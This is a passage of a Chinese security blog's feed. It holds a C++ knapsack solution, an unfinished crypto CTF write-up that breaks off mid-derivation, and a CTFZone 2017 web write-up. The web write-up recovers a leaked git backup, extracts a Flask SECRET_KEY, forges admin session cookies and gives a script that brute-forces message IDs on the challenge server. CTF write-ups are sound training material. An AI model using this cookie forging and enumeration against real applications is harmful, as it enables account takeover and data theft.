class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> unit&#123;</div><div class="line">    <span class="keyword">double</span> unitValue;</div><div class="line">    <span class="keyword">int</span> id;</div><div class="line">    <span class="keyword">double</span> weight;</div><div class="line">    <span class="keyword">double</span> value;</div><div class="line">&#125;unit;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(unit s[], <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">double</span> m,n;</div><div class="line">    <span class="keyword">static</span> unit valuesor[<span class="number">100010</span>];</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%lf%lf"</span>,&amp;m,&amp;n);</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%lf%lf"</span>,&amp;valuesor[i].weight,&amp;valuesor[i].value);</div><div class="line">        valuesor[i].unitValue = (<span class="keyword">double</span>)valuesor[i].value / (<span class="keyword">double</span>)valuesor[i].weight;</div><div class="line">        valuesor[i].id = i;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    quick_sort(valuesor,<span class="number">1</span>,n);</div><div class="line"></div><div class="line">    <span class="keyword">double</span> remainSpace = m;</div><div class="line">    <span class="keyword">double</span> allValue = <span class="number">0</span>;</div><div class="line">    i = <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n ; i++)&#123;</div><div class="line">        <span class="keyword">if</span> (remainSpace &lt;= <span class="number">0</span>)</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">if</span> (valuesor[i].weight &lt;= remainSpace)&#123;</div><div class="line">            remainSpace = remainSpace - valuesor[i].weight;</div><div class="line">            allValue += valuesor[i].value;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            allValue += remainSpace *valuesor[i].unitValue;</div><div class="line">            remainSpace = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%lf\n"</span>,allValue);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(unit s[], <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (l &lt; r)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">int</span> i = l, j = r;</div><div class="line">        unit x = s[l];</div><div class="line"></div><div class="line">        <span class="keyword">while</span> (i &lt; j)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; s[j].unitValue &lt;= x.unitValue)</div><div class="line">                j--;</div><div class="line">            <span class="keyword">if</span>(i &lt; j)&#123;</div><div class="line">                s[i].unitValue = s[j].unitValue;</div><div class="line">                s[i].id = s[j].id;</div><div class="line">                s[i].value = s[j].value;</div><div class="line">                s[i].weight = s[j].weight;</div><div class="line">                i++;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; s[i].unitValue &gt;= x.unitValue)</div><div class="line">                i++;</div><div class="line">            <span class="keyword">if</span>(i &lt; j)&#123;</div><div class="line">                s[j].unitValue = s[i].unitValue;</div><div class="line">                s[j].id = s[i].id;</div><div class="line">                s[j].value = s[i].value;</div><div class="line">                s[j].weight = s[i].weight;</div><div class="line">                j--;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        s[i].id = x.id;</div><div class="line">        s[i].unitValue = x.unitValue;</div><div class="line">        s[i].value = x.value;</div><div class="line">        s[i].weight = x.weight;</div><div class="line">        quick_sort(s, l, i - <span class="number">1</span>);</div><div class="line">        quick_sort(s, i + <span class="number">1</span>, r);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近更新日期：2017-06-21&lt;br&gt;干脆把自己平日做的题放在一篇文章里吧。不然太分散了。&lt;br&gt;POJ: 1163 1258 1273 1979 2387 2388 3069 3176 3253 3617&lt;br&gt;XOJ: 1004 1005 1022 1061 1062 1075 1078 1316&lt;br&gt;
    
    </summary>
    
      <category term="编程练习" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
    
    
      <category term="编程练习" scheme="http://yoursite.com/tags/%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
    
      <category term="算法" scheme="http://yoursite.com/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="ACM" scheme="http://yoursite.com/tags/ACM/"/>
    
  </entry>
  
  <entry>
    <title>Meenpwn-2017-crypto-writeup</title>
    <link href="http://yoursite.com/2017/07/19/Meenpwn-2017-crypto-writeup/"/>
    <id>http://yoursite.com/2017/07/19/Meenpwn-2017-crypto-writeup/</id>
    <published>2017-07-19T12:07:01.000Z</published>
    <updated>2017-07-20T01:03:58.481Z</updated>
    
    <content type="html"><![CDATA[<h1 id="nub-cryptosystem"><a href="#nub-cryptosystem" class="headerlink" title="nub_cryptosystem"></a>nub_cryptosystem</h1><h1 id="Simpler-than-RSA"><a href="#Simpler-than-RSA" class="headerlink" title="Simpler than RSA?"></a>Simpler than RSA?</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&quot;RSA is just math&quot;. And now, there is a cryptosystem that simpler than RSA, but, &quot;Simple is the Best!&quot;</div><div class="line">simple.py pubkey.txt enc.txt</div></pre></td></tr></table></figure>
<p>simple.py：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> FLAG</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(nbits)</span>:</span></div><div class="line">	p = getPrime(nbits)</div><div class="line">	q = getPrime(nbits)</div><div class="line">	n = p * q * p</div><div class="line">	g = random.randint(<span class="number">1</span>, n)</div><div class="line">	h = pow(g, n, n)</div><div class="line">	<span class="keyword">return</span> (n, g, h)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(m, n, g, h)</span>:</span></div><div class="line">	r = random.randint(<span class="number">1</span>, n)</div><div class="line">	c = pow(pow(g, m, n) * pow(h, r, n), <span class="number">1</span>, n)</div><div class="line">	<span class="keyword">return</span> c</div><div class="line"></div><div class="line">m = [ord(char) <span class="keyword">for</span> char <span class="keyword">in</span> FLAG]</div><div class="line">n, g, h = generate(<span class="number">90</span>)</div><div class="line">open(<span class="string">"pubkey.txt"</span>, <span class="string">"w"</span>).write(<span class="string">"&#123;0&#125;:&#123;1&#125;:&#123;2&#125;"</span>.format(n, g, h))</div><div class="line"></div><div class="line">c = [encrypt(mi, n, g, h) <span class="keyword">for</span> mi <span class="keyword">in</span> m]</div><div class="line">open(<span class="string">"enc.txt"</span>, <span class="string">"w"</span>).write(str(c))</div></pre></td></tr></table></figure></p>
<p><a href="https://gist.githubusercontent.com/quandqn/9cbae5f35d95dc0cf1b70a426a6da6e1/raw/e41da0cbf9897892f4737d4b412cdd5a53e6bd73/enc.txt" target="_blank" rel="external">enc.txt</a>和<a href="https://gist.githubusercontent.com/quandqn/991dfaf118779e498246077eca61f479/raw/d02c0f6c9ad749bb2f98896f979672e3d866298e/pubkey.txt" target="_blank" rel="external">pubkey.txt</a>就不直接贴出来了。</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="前期分析"><a href="#前期分析" class="headerlink" title="前期分析"></a>前期分析</h3><p>先对题目进行一下分析。目前已知<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">n = 1235280093599323856390922798440377476467763531842392869674688408727824382702235317</div><div class="line">g = 1110549711091392805024587195974719739929628997819528005374351081843256209971586072</div><div class="line">h = 610466084395822279908554174354632326166097007218620288020807622478449585661028278</div></pre></td></tr></table></figure></p>
<p>密文c也已知。由simply.py知道：</p>
<script type="math/tex; mode=display">c = [(g^{m}\mod n)\times(h^{r}\mod n )]\mod n</script><p>可以推出：</p>
<script type="math/tex; mode=display">c\equiv(g^{m}\times h^{r}) \mod n</script><p>其中的<code>r</code>是未知的，我们要想办法消去它。</p>
<p>继续分析。n = p <em> q </em> p，其中q，p均为质数，拿到<a href="http://factordb.com/index.php?query=1235280093599323856390922798440377476467763531842392869674688408727824382702235317" target="_blank" rel="external">factordb</a>上分解出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">p = 1057817919251064684989791981</div><div class="line">q = 1103935256393984899021164397</div></pre></td></tr></table></figure></p>
<h3 id="引理"><a href="#引理" class="headerlink" title="引理"></a>引理</h3><p>参考：<a href="http://home.scarlet.be/math/congr.htm#The-smallest-solutio" target="_blank" rel="external">The smallest solution of a^x = 1 mod m with (a,m) = 1</a>，这边简要记录。<br>假设正整数n是满足下列同余式的最小正整数，并且a和m互质：</p>
<script type="math/tex; mode=display">a^{n}\equiv 1\mod m</script><p>由欧拉定理，有如下同余式。其中φ(m)是m的欧拉函数，表示小于m的与m互质的正整数的个数。</p>
<script type="math/tex; mode=display">a^{φ(m)}\equiv 1\mod m</script><p>现在假设$φ(m)=n\times{q}+r$，其中n的意义同上，q为商，r为余数。则欧拉定理可以改写为：</p>
<script type="math/tex; mode=display">a^{n\times{q}+r}\equiv 1\mod m</script><p>又因为$ a^{n\times{q}}\equiv 1\mod m $（这是n的性质），所以有：</p>
<script type="math/tex; mode=display">a^{r}\equiv 1\mod m</script><p>因为r&lt;n，而n是使同余式成立的最小正整数，所以必有r=0。所以接下去推导有：</p>
<script type="math/tex; mode=display">a^{q}\equiv 1\mod m</script><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>回到本题中，$n={p}^{2}\times{q}$，接下来我们考虑n的<a href="https://baike.baidu.com/item/%E6%AC%A7%E6%8B%89%E5%87%BD%E6%95%B0/1944850?fr=aladdin" target="_blank" rel="external">欧拉函数φ(n)</a>。<br>因为：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170718/12.jpg?raw=true" alt=""></p>
<p>所以：</p>
<script type="math/tex; mode=display">φ(n) = φ(p^{2}) \times φ(q)</script><p>因为：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170718/13.jpg?raw=true" alt=""></p>
<p>所以：</p>
<script type="math/tex; mode=display">φ(p^{2}) = (p-1) \times (p^{2-1}) = (p-1) \times p</script><script type="math/tex; mode=display">φ(q) = (q-1) \times (q^{1-1}) = q-1</script><p>所以对φ(n)，有如下等式成立：</p>
<script type="math/tex; mode=display">φ(n) = p \times {(p-1)} \times {(q-1)}</script><script type="math/tex; mode=display">a\equiv b\pmod{cd}</script><p>  $a\equiv b\pmod{cd} $</p>
<h1 id="justpad"><a href="#justpad" class="headerlink" title="justpad"></a>justpad</h1><h1 id="T"><a href="#T" class="headerlink" title="|\/|/-\T|-|"></a>|\/|/-\T|-|</h1><h1 id="Freedom-Curve"><a href="#Freedom-Curve" class="headerlink" title="Freedom Curve"></a>Freedom Curve</h1>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;nub-cryptosystem&quot;&gt;&lt;a href=&quot;#nub-cryptosystem&quot; class=&quot;headerlink&quot; title=&quot;nub_cryptosystem&quot;&gt;&lt;/a&gt;nub_cryptosystem&lt;/h1&gt;&lt;h1 id=&quot;Simpler-t
    
    </summary>
    
      <category term="密码学" scheme="http://yoursite.com/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="crypto" scheme="http://yoursite.com/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>CTFZone-2017-Leaked messages-writeup</title>
    <link href="http://yoursite.com/2017/07/19/CTFZone-2017-Leaked-messages-writeup/"/>
    <id>http://yoursite.com/2017/07/19/CTFZone-2017-Leaked-messages-writeup/</id>
    <published>2017-07-19T08:44:14.000Z</published>
    <updated>2017-07-19T08:46:03.151Z</updated>
    
    <content type="html"><![CDATA[<p>CTFZone-2017-Leaked messages-writeup<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">One of our candidates used to send restricted data to colleagues via this service</div><div class="line">because it&apos;s free and easy to use.</div><div class="line">Try to get some secrets which can compromise them.</div><div class="line">82.202.204.104</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170718/3.jpg?raw=true" alt=""><br>先注册一个账号，登陆</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170718/4.jpg?raw=true" alt=""></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170718/5.jpg?raw=true" alt=""></p>
<p>御剑扫出目录：<a href="http://82.202.204.104/backup/" target="_blank" rel="external">http://82.202.204.104/backup/</a></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170718/1.jpg?raw=true" alt=""></p>
<p>看文件，猜测是git泄露。用lijiejie的Githack只能下载到文件，没办法git log，而rip-git.pl提示说<code>[!] No more items to fetch. That&#39;s it!</code>，所以最后使用的工具是<a href="https://github.com/internetwache/GitTools" target="_blank" rel="external">GitTools</a>，不过如果直接用的话，会提示说没有找到<code>.git</code>目录，可以先将gitdumper.sh中以下代码去掉：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">if [[ ! &quot;$BASEURL&quot; =~ /.git/$ ]]; then</div><div class="line">    echo -e &quot;\e[31m[-] /.git/ missing in url\e[0m&quot;;</div><div class="line">    exit 0;</div><div class="line">fi</div></pre></td></tr></table></figure></p>
<p>执行命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/gitdumper.sh  http://82.202.204.104/backup/ dumper_LeakMessages</div></pre></td></tr></table></figure></p>
<p>之后查看git log，如下命令,其中<code>--no-paper</code>禁用paper分页，发现有flag.txt：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git --no-pager log -p -1</div></pre></td></tr></table></figure></p>
<p>得到如下结果：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170718/2.jpg?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; import base64</div><div class="line">&gt;&gt;&gt; base64.b32decode(&quot;MN2GM6TPNZSXW63IOR2HA4Z2F4XXS33VOR2WEZJOMNXW2L3XMF2GG2B7OY6UOMKJMJJHK2TLN4WUC7L5&quot;)</div><div class="line">&apos;ctfzone&#123;&#123;https://youtube.com/watch?v=G1IbRujko-A&#125;&#125;&apos;</div></pre></td></tr></table></figure>
<p>可惜，这是个假的flag。接下来利用extractor.sh 将历次commit的内容恢复出来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">../Extractor/extractor.sh dumper_LeakMessages/  extra_Leakmessages</div></pre></td></tr></table></figure></p>
<p>目录结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">├── 0-bd55b19e5413ce609d3bc4429c3a6f272341988a</div><div class="line">│   ├── commit-meta.txt</div><div class="line">│   ├── config.pyc</div><div class="line">│   ├── requirements.txt</div><div class="line">│   └── templates</div><div class="line">│       ├── index.html</div><div class="line">│       ├── login.html</div><div class="line">│       ├── messages.html</div><div class="line">│       └── register.html</div><div class="line">├── 1-8b1084b23d869e5dc1ae4ac845589ecfb896c0c3</div><div class="line">│   ├── commit-meta.txt</div><div class="line">│   ├── requirements.txt</div><div class="line">│   ├── static</div><div class="line">│   │   ├── css</div><div class="line">│   │   │   ├── bootstrap.min.css</div><div class="line">│   │   │   ├── login.css</div><div class="line">│   │   │   ├── main.css</div><div class="line">│   │   │   └── material-input.css</div><div class="line">│   │   ├── flag.txt</div><div class="line">│   │   └── js</div><div class="line">│   │       └── bootstrap.min.js</div><div class="line">│   └── templates</div><div class="line">│       ├── index.html</div><div class="line">│       ├── login.html</div><div class="line">│       ├── messages.html</div><div class="line">│       └── register.html</div><div class="line">└── 2-9f848cceeba31da2cbd2c8ecaebb8a8dab17eee4</div><div class="line">    ├── commit-meta.txt</div><div class="line">    ├── requirements.txt</div><div class="line">    ├── static</div><div class="line">    │   ├── css</div><div class="line">    │   │   ├── bootstrap.min.css</div><div class="line">    │   │   ├── login.css</div><div class="line">    │   │   ├── main.css</div><div class="line">    │   │   └── material-input.css</div><div class="line">    │   └── js</div><div class="line">    │       └── bootstrap.min.js</div><div class="line">    └── templates</div><div class="line">        ├── index.html</div><div class="line">        ├── login.html</div><div class="line">        ├── messages.html</div><div class="line">        └── register.html</div></pre></td></tr></table></figure></p>
<p>先读取一下requirements.txt，知道是flask应用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cat requirements.txt</div><div class="line">flask</div><div class="line">flask_recaptcha</div></pre></td></tr></table></figure></p>
<p>其中的<code>config.pyc</code>是其配置文件。利用<a href="https://github.com/rocky/python-uncompyle6" target="_blank" rel="external">uncompyle6</a>进行反汇编：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/test# uncompyle6 config.pyc</div><div class="line"># uncompyle6 version 2.11.2</div><div class="line"># Python bytecode 3.6 (3379)</div><div class="line"># Decompiled from: Python 2.7.13 (default, Jan 19 2017, 14:48:08)</div><div class="line"># [GCC 6.3.0 20170118]</div><div class="line"># Embedded file name: config.py</div><div class="line"># Compiled at: 2017-07-15 01:28:42</div><div class="line"># Size of source mod 2**32: 288 bytes</div><div class="line"></div><div class="line"></div><div class="line">class BaseConfig(object):</div><div class="line">    DEBUG = False</div><div class="line">    SECRET_KEY = &apos;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&apos;</div><div class="line">    DB_NAME = &apos;messages.db&apos;</div><div class="line">    RECAPTCHA_ENABLED = True</div><div class="line">    RECAPTCHA_THEME = &apos;dark&apos;</div><div class="line">    RECAPTCHA_TYPE = &apos;image&apos;</div><div class="line">    RECAPTCHA_SIZE = &apos;normal&apos;</div><div class="line">    RECAPTCHA_RTABINDEX = 10</div><div class="line"># okay decompiling config.pyc</div></pre></td></tr></table></figure></p>
<p><code>SECRET_KEY</code>用于生成flask session。可以用<a href="https://github.com/noraj1337/flask-session-cookie-manager" target="_blank" rel="external">Flask Session Cookie Decoder/Encoder</a>进行解密。比如前面用burp抓包得到的session：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">session=eyJudW1iZXIiOiIzMjY0MTAwMzE3MjYiLCJ1c2VybmFtZSI6ImNoeWJldGEifQ.DFBD8w.f5sHhO4vBngV-EtNRMOPw28PFkA</div></pre></td></tr></table></figure></p>
<p>对其进行解密：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/flask-session-cookie-manager# python session_cookie_manager.py decode -c &quot;eyJudW1iZXIiOiIzMjY0MTAwMzE3MjYiLCJ1c2VybmFtZSI6ImNoeWJldGEifQ.DFBD8w.f5sHhO4vBngV-EtNRMOPw28PFkA&quot; -s &quot;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&quot;  </div><div class="line">&#123;u&apos;username&apos;: u&apos;chybeta&apos;, u&apos;number&apos;: u&apos;326410031726&apos;&#125;</div></pre></td></tr></table></figure></p>
<p>现在我们就可以利用这个脚本来伪造cookie了，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/flask-session-cookie-manager# python session_cookie_manager.py encode -s &apos;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&apos; -t &apos;&#123;&quot;username&quot;:&quot;chybeta&quot;,&quot;number&quot;:&quot;326410031725&quot;&#125;&apos;</div><div class="line"></div><div class="line">eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOekkxIn0sInVzZXJuYW1lIjp7IiBiIjoiWTJoNVltVjBZUT09In19.DEh3qQ.yq3ZCE5Mpoy74D9e3wkfbbenU1E</div></pre></td></tr></table></figure></p>
<p>现在我们利用下面这个脚本，来获取admin的各条信息，number的上下限是通过测试出来的。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># standard imports</span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> zlib</div><div class="line"><span class="keyword">import</span> ast</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</div><div class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">reload(sys)</div><div class="line">sys.setdefaultencoding(<span class="string">'utf-8'</span>)</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">MockApp</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, secret_key)</span>:</span></div><div class="line">        self.secret_key = secret_key</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">session_cookie_encoder</span><span class="params">(secret_key, session_cookie_structure)</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        app = MockApp(secret_key)</div><div class="line">        session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</div><div class="line">        si = SecureCookieSessionInterface()</div><div class="line">        s = si.get_signing_serializer(app)</div><div class="line"></div><div class="line">        <span class="keyword">return</span> s.dumps(session_cookie_structure)</div><div class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">        <span class="keyword">return</span> <span class="string">"[Encoding error]&#123;&#125;"</span>.format(e)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    number_min = <span class="number">326410000000</span></div><div class="line">    number_max = <span class="number">326410030240</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> number <span class="keyword">in</span>  range(number_min,number_max):</div><div class="line">        file_message = open(<span class="string">"message.txt"</span>,<span class="string">'w'</span>)</div><div class="line">        secret_key = <span class="string">".&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d"</span></div><div class="line">        cookie_structure = <span class="string">"&#123;'username':'admin','number':"</span>+ str(number) + <span class="string">"&#125;"</span></div><div class="line">        session  = session_cookie_encoder(secret_key, cookie_structure)</div><div class="line">        cookie = &#123;<span class="string">'session'</span>:session&#125;</div><div class="line">        url = <span class="string">"http://82.202.204.104/messages"</span></div><div class="line">        content = requests.get(url,cookies=cookie)</div><div class="line">        start_index = content.text.find(<span class="string">'&lt;span class="message"&gt;'</span>)+len(<span class="string">'&lt;span class="message"&gt;'</span>)</div><div class="line">        end_index = content.text.find(<span class="string">'&lt;/span&gt;\n    &lt;/div&gt;\n  &lt;/body&gt;\n&lt;/html&gt;'</span>)</div><div class="line">        <span class="keyword">if</span> <span class="string">"You have no messages yet"</span> <span class="keyword">not</span> <span class="keyword">in</span> content.text:</div><div class="line">            <span class="keyword">print</span> number</div><div class="line">            file_message.writelines(str(number)+<span class="string">":"</span>+str(content.text[start_index:end_index]))</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">continue</span></div><div class="line"></div><div class="line">file_message.close()</div></pre></td></tr></table></figure></p>
<p>在message.txt中查找：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/flask-session-cookie-manager# cat message.txt | grep &quot;http&quot;</div><div class="line">It&amp;#39;s so cool! https://postimg.org/image/41t4h680r/</div></pre></td></tr></table></figure></p>
<p><img src="https://s17.postimg.org/l2c0pul25/photo_2017-07-14_18-44-51.jpg" alt=""><br>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ctfzone&#123;b1d4207ff1965105af775cfa71d8214d&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CTFZone-2017-Leaked messages-writeup&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
